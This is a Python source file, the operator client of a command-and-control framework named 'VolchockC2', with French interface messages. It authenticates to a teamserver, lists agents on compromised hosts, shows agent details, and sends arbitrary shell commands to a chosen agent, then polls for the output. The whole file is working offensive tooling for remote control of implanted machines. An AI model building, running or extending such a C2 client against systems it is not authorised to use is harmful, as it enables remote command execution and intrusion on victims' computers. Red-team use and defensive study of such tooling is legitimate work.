import argparse
import requests
from requests.auth import HTTPBasicAuth
import time
from datetime import datetime

def list_agents(base_url, auth):
    resp = requests.get(f"{base_url}/agents", auth=auth)
    if resp.status_code == 401:
        print("[!] Accès refusé ! Identifiants invalides.")
        return []
    agents = resp.json().get("agents", [])
    print("[*] Agents enregistrés :")
    for idx, ag in enumerate(agents):
        print(f"  {idx}: {ag.get('agent_id')}  (host: {ag.get('hostname')})")
    return agents

def get_agent_info(base_url, agent_id, auth):
    resp = requests.get(f"{base_url}/agent/{agent_id}/info", auth=auth)
    if resp.ok:
        info = resp.json().get("info", {})
        for k, v in info.items():
            if k == "last_seen":
                print(f"  {k}: {datetime.fromtimestamp(v).strftime('%Y-%m-%d %H:%M:%S')}")
            else:
                print(f"  {k}: {v}")
    else:
        print("[!] Impossible de récupérer les infos de l'agent.")

def queue_shell_command(base_url, agent_id, command, auth):
    payload = {"command": command}
    resp = requests.post(f"{base_url}/agent/{agent_id}/command", json=payload, auth=auth)
    if resp.status_code == 401:
        print("[!] Accès refusé ! Identifiants invalides.")

def get_latest_result(base_url, agent_id, auth):
    resp = requests.get(f"{base_url}/agent/{agent_id}/results", auth=auth)
    if resp.ok:
        results = resp.json().get("results", [])
        return results
    else:
        print("[!] Impossible de récupérer le résultat.")
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VolchockC2 client shell")
    parser.add_argument('-i', '--ip-address', required=True, help='IP du teamserver')
    parser.add_argument('-p', '--port', required=True, type=int, help='Port du teamserver')
    parser.add_argument('-u', '--username', required=True, help="Nom d'utilisateur admin")
    parser.add_argument('--pwd', '--password', dest='password', required=True, help="Mot de passe admin")
    args = parser.parse_args()

    base_url = f"http://{args.ip_address}:{args.port}"
    auth = HTTPBasicAuth(args.username, args.password)

    while True:
        choice = input("volchockC2> ").strip()
        if choice == "list":
            agents = list_agents(base_url, auth)
        elif choice.startswith("use "):
            try:
                idx = int(choice.split()[1])
            except (IndexError, ValueError):
                print("Usage: use <num>")
                continue
            agents = list_agents(base_url, auth)
            if not agents or not (0 <= idx < len(agents)):
                print("Numéro d'agent invalide.")
                continue
            agent_id = agents[idx].get("agent_id")
            # Context shell pour cet agent :
            while True:
                ach = input("volchockC2 - agent> ").strip()
                if ach in ("back", "exit", "quit"):
                    break
                elif ach == "infos":
                    get_agent_info(base_url, agent_id, auth)
                elif ach.startswith("shell "):
                    cmd = ach[len("shell "):].strip()
                    if not cmd:
                        print("Usage: shell <commande>")
                        continue
                    queue_shell_command(base_url, agent_id, cmd, auth)
                    last_seen = None
                    for i in range(10):
                        results = get_latest_result(base_url, agent_id, auth)
                        if results is None:
                            break
                        if results:
                            # On identifie le résultat par sa valeur, ou un id si présent
                            latest = results[-1]
                            if latest != last_seen:
                                print(f"{latest}")
                                last_seen = latest
                                break  # on s’arrête après le premier affichage
                        time.sleep(1)
                elif len(ach)<1:
                    pass
                else:
                    print("Commandes valides: infos, shell <cmd>, back")
        elif choice in ("quit", "exit"):
            print("Bye.")
            break
        elif len(choice)<1:
            pass
        else:
            print("Commandes valides : list, use <num>, quit")
